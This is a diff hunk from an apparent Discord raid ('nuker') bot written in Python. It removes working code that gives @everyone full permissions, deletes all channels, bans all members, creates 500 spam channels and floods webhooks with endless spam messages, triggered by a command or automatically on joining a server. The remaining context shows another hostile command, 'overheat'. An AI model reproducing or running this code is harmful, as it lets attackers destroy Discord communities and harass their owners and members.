@@ -55,53 +55,7 @@ asdf
 """)
   await author.send(embed = cmds)
   
-@client.command()
-async def orgia(ctx):
-  await ctx.message.delete()
-  guild = ctx.guild
-  await nuke(guild)
-  
-@client.event
-async def on_guild_join(guild):
-  if nuke_on_join == True:
-    await asyncio.sleep(nuke_wait_time)
-    await nuke(guild)
-  else:
-    return
-  
-@bot.event
-async def on_guild_channel_create(channel):
-  webhook = await channel.create_webhook(name = "nuked")
-  webhook_url = webhook.url
-  async with aiohttp.ClientSession() as session:
-    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
-    while True:
-      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
-  
-async def nuke(guild):
-  print(f"{C.WHITE}Nuking {guild.name}.")
-  role = discord.utils.get(guild.roles, name = "@everyone")
-  try:
-    await role.edit(permissions = discord.Permissions.all())
-    print(f"{C.GREEN}Successfully granted admin permissions in {C.WHITE}{guild.name}")
-  except:
-    print(f"{C.RED}Admin permissions NOT GRANTED in {C.WHITE}{guild.name}")
-  for channel in guild.channels:
-    try:
-      await channel.delete()
-      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
-    except:
-      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")
-  for member in guild.members:
-    try:
-      await member.ban()
-      print(f"{C.GREEN}Successfully banned {C.WHITE}{member.name}")
-    except:
-      print(f"{C.WHITE}{member.name} {C.RED}has NOT been banned.")
-  for i in range(500):
-    await guild.create_text_channel(random.choice(channel_names))
-  print(f"{C.GREEN}Nuked {guild.name}.")
-    
+
 @client.command()
 async def overheat(ctx):
   await ctx.message.delete()
